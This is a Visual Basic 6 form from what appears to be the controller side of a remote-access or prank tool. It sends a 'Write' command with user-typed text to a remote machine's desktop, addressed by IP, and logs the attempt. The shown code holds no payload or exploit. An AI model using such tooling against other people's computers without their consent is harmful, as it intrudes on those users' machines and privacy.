VERSION 5.00
Begin VB.Form frmGetText 
   BackColor       =   &H00000000&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Write on users desktop"
   ClientHeight    =   855
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   855
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command2 
      Caption         =   "&Cancel"
      Height          =   315
      Left            =   3000
      TabIndex        =   3
      Top             =   480
      Width           =   735
   End
   Begin VB.CommandButton Command1 
      Caption         =   "OK"
      Height          =   315
      Left            =   3840
      TabIndex        =   2
      Top             =   480
      Width           =   735
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H00404040&
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   960
      TabIndex        =   1
      Top             =   120
      Width           =   3615
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Enter Text:"
      ForeColor       =   &H0000C000&
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   855
   End
End
Attribute VB_Name = "frmGetText"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Command1_Click()
    SendData "Write," & Text1
    
    Dim Msg As String
    Msg = " -->Attempting to write on the users Desktop at: " & CurrentIP
    Logit Msg
End Sub

Private Sub Command2_Click()
    Text1 = ""
    Unload Me
End Sub
